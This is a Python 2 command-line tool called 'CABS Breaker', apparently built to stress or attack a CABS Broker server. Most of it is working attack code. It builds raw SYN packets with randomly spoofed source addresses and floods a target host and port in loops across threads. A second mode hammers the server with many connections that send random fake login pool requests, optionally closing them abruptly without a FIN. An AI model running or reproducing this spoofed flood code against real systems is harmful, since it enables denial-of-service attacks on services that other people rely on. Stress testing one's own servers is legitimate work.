#!/usr/bin/python
import socket, ssl
import os
import struct
import random
import sys
import string
import threading
from os.path import isfile


settings = {}

def splash():
    print"""
           _______ _______ ______  _______              
           |       |_____| |_____] |______              
           |_____  |     | |_____] ______|              
                                                        
 ______   ______ _______ _______ _     _ _______  ______
 |_____] |_____/ |______ |_____| |____/  |______ |_____/
 |_____] |    \_ |______ |     | |    \_ |______ |    \_
                                                        
"""

def checksum(msg):
    #genetate checksum for raw packet
    cksum = 0
    for i in range(0, len(msg), 2):
        w = (ord(msg[i]) << 8) + (ord(msg[i+1]) )
        cksum = cksum + w
    cksum = (cksum >> 16) + (cksum & 0xffff)
    cksum = ~cksum & 0xffff
    
    return cksum

def genIP():
    skip = [127,169,172]
    
    first = random.randrange(1,256)
    while first in skip:
        first = random.randrange(1,256)
    
    ip = '.'.join([str(first),str(random.randrange(1,256)),str(random.randrange(1,256)),str(random.randrange(1,256))])
    return ip

def floodServer():
    #flood portion adopted from a script by Silver Moon (m00n.silv3r@gmail.com)
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except:
        print "Socket could not be created, make sure you have root permission"
        sys.exit()
    #Don't put in automatic headers
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    #Constuct packet
    packet = ''
    if not settings.get("Host_IP"):
        host = socket.gethostbyname(settings.get("Host"))
        settings["Host_IP"] = host
    else:
        host = settings.get("Host_IP")
    source = genIP()
    
    #ip headers
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20 #python correctly fills in the total length?
    packetid = random.randint(1025,65000)
    frag_off = 0
    ttl = 225
    protocol = socket.IPPROTO_TCP
    check = 10 #python correcly fills in the checksum?
    saddr = socket.inet_aton(source)
    daddr = socket.inet_aton(host)
    ihl_version = (version << 4) + ihl
    ip_header = struct.pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, packetid, frag_off, ttl, protocol, check, saddr, daddr)
    
    #tcp header fields
    source_p = random.randint(1025, 65532)
    host_p = int(settings.get("Port"))
    seq = 0
    ack_seq = 0
    doff = 5
    #flags
    fin = 0
    syn = 1
    rst = 0
    psh = 0
    ack = 0
    urg = 0
    window = socket.htons(5840) #max window
    check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
    tcp_header = struct.pack('!HHLLBBHHH', source_p, host_p, seq, ack_seq, offset_res, tcp_flags, window, check, urg_ptr)
    
    #pseudo headers
    source_address = socket.inet_aton(source)
    dest_address = socket.inet_aton(host)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack('!4s4sBBH', source_address, dest_address, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    
    tcp_checksum = checksum(psh)
    
    #make tcp_header with correct checksum
    tcp_header = struct.pack('!HHLLBBHHH', source_p, host_p, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
    #make the final packet
    packet = ip_header + tcp_header
    if settings.get("Rand_Roll") == 'True':
        try:
            s.sendto(packet, (host, 0))
            if settings.get("Verbose") == 'True':
                print "Sent: SYN packet from {0}:{1} to {2}:{3}".format(source, source_p, host, host_p)
        except:
            if settings.get("Verbose") == 'True':
                print "Unable to send SYN packet."
    else:
        if settings.get("Number") == 'loop':
            print("Running... Press Ctrl-C to end")
            while True:
                try:
                    s.sendto(packet, (host, 0))
                    if settings.get("Verbose") == 'True':
                        print "Sent: SYN packet from {0}:{1} to {2}:{3}".format(source, source_p, host, host_p)
                except Exception as e:
                    print e
                    if settings.get("Verbose") == 'True':
                        print "Unable to send SYN packet."
        else:
            for i in range(int(settings.get("Number"))):
                try:
                    s.sendto(packet, (host, 0))
                    if settings.get("Verbose") == 'True':
                        print "Sent: SYN packet from {0}:{1} to {2}:{3}".format(source, source_p, host, host_p)
                except Exception as e:
                    print e
                    if settings.get("Verbose") == 'True':
                        print "Unable to send SYN packet."
        

def hitServer():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((settings.get("Host"), int(settings.get("Port"))))
    except Exception as e:
        print "Error:", e
    else:
        if settings.get("Evil_Close") == 'True':
            linger = 1
            lingertime = 0
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', linger, lingertime))
        if not settings.get("Message"):
            name = "".join( [random.choice(string.letters) for i in range(int(settings.get("Rand_Length")))] )
            paswd = "".join( [random.choice(string.letters) for i in range(int(settings.get("Rand_Length")))] )
            content = "pr:{0}:{1}".format(name, paswd)
        else:
            content = settings.get("Message")
        if settings.get("No_Return") != 'True':
            content += '\r\n'
        if (settings.get("SSL_Cert") is None) or (settings.get("SSL_Cert") == 'None'):
            s_wrapped = s
        else:
<target>
            s_wrapped = ssl.wrap_socket(s, ca_certs=settings.get("SSL_Cert"), ssl_version=ssl.PROTOCOL_SSLv23)
</target>
        s_wrapped.sendall(content)
        s_wrapped.close()
        if settings.get("Verbose") == 'True':
            print "Sent: {0}".format(content)

def printUsage(extend=False):
    print "Usage : "+sys.argv[0]+" -h host [-p port] [(-f)|(-ff)] [-v] [-s /path/to/cert.pem] [-r] [-e] [-n (#tries | loop)] [-t #threads] [(-m msg) | (-l msg_length)]"
    if extend:
        print "  -h host           : the CABS Broker Server"
        print "  -p port           : the CABS Broker Port for Clients or Agents"
        print "  -f                : SYN flood, only available on linux as root"
        print "  -ff               : SYN flood one packet, only available on linux as root"
        print "  -v                : Verbose, warning this outputs a lot!"
        print "  -s /to/cert.pem   : the path to the CABS Broker certificate.pem"
        print "  -r                : don't add a valid return at the end of the message"
        print "  -e                : disconnect evily, with no FIN packet"
        print "  -n (#tries | loop): the number of requests to send, or loop until key press"
        print "  -t #threads       : the number of threads for making requests"
        print "  -m msg            : the message to send, otherwise a random user name and password will be sent in a pool request"
        print "  -l msg_length     : the length of the random username and password"
    else:
        print "      : "+sys.argv[0]+" -? for extra info"
    sys.exit()

def getArgs():
    global settings
    #read command line arguments
    option = None
    for i in range(1,len(sys.argv)):
        if option is not None:
            if sys.argv[i].startswith('-'):
                printUsage()
            settings[option] = sys.argv[i]
            option = None
        else:
            if sys.argv[i] in ['-?', '?', '--help', '-help']:
                printUsage(True)
            elif sys.argv[i] in ['-h', '--host', '-host']:
                option = "Host"
            elif sys.argv[i] in ['-ff', '--flood-one', '-flood-one', '--syn-flood-one']:
                settings["Syn_Flood"] = 'True'
            elif sys.argv[i] in ['-f', '--flood', '-flood', '--syn-flood']:
                settings["Syn_Flood"] = 'True'
                settings["Rand_Roll"] = 'True'
            elif sys.argv[i] in ['-v', '--verbose', '-verbose']:
                settings["Verbose"] = 'True'
            elif sys.argv[i] in ['-p', '--port', '-port']:
                option = "Port"
            elif sys.argv[i] in ['-s', '--ssl_cert', '--ssl', '-ssl']:
                option = "SSL_Cert"
            elif sys.argv[i] in ['-r', '--return', '-return']:
                settings["No_Return"] = 'True'
            elif sys.argv[i] in ['-e', '--evil', '-evil']:
                settings["Evil_Close"] = 'True'
            elif sys.argv[i] in ['-m', '--msg', '-msg', '--message', '-message']:
                option = "Message"
            elif sys.argv[i] in ['-l', '--length', '-length', '--msg_length']:
                option = "Rand_Length"
            elif sys.argv[i] in ['-n', '--tries', '-tries', '--number', '-number']:
                option = "Number"
            elif sys.argv[i] in ['-t', '--threads', '-threads']:
                option = "Threads"

    #fill in defaults or fail
    if not settings.get("Host"):
        printUsage()
    if not settings.get("Port"):
        settings["Port"] = "18181"
    if not settings.get("Rand_Length"):
        settings["Rand_Length"] = "30"
    if not settings.get("Number"):
        settings["Number"] = "300"
    if not settings.get("Threads"):
        settings["Threads"] = 1

def runFlood():
    if settings.get("Rand_Roll") == 'True':
        if settings.get("Number") == 'loop':
            print("Running... Press Ctrl-C to end")
            while True:
                floodServer()
        else:
            for i in range(int(settings.get("Number"))):
                floodServer()
    else:
        floodServer()

def runHit():
    if settings.get("Number") == 'loop':
        while True:
            hitServer()
    else:
        for i in range(int(settings.get("Number"))):
            hitServer()

def gucci_main():
    getArgs()
    splash()
   
    if int(settings.get("Threads")) > 1:
        threads = []
        for i in range(int(settings.get("Threads"))):
            if settings.get("Syn_Flood") == 'True':
                t=threading.Thread(target=runFlood)
            else:
                t=threading.Thread(target=runHit)
            
            if settings.get("Number") == 'loop':
                t.daemon = True
            threads.append(t)
            t.start()
        if settings.get("Number") == 'loop':
            input("Running... Press Enter to end")
    else:
        if settings.get("Syn_Flood") == 'True':
            runFlood()
        else:
            runHit()
    

if __name__ == "__main__":
        gucci_main()


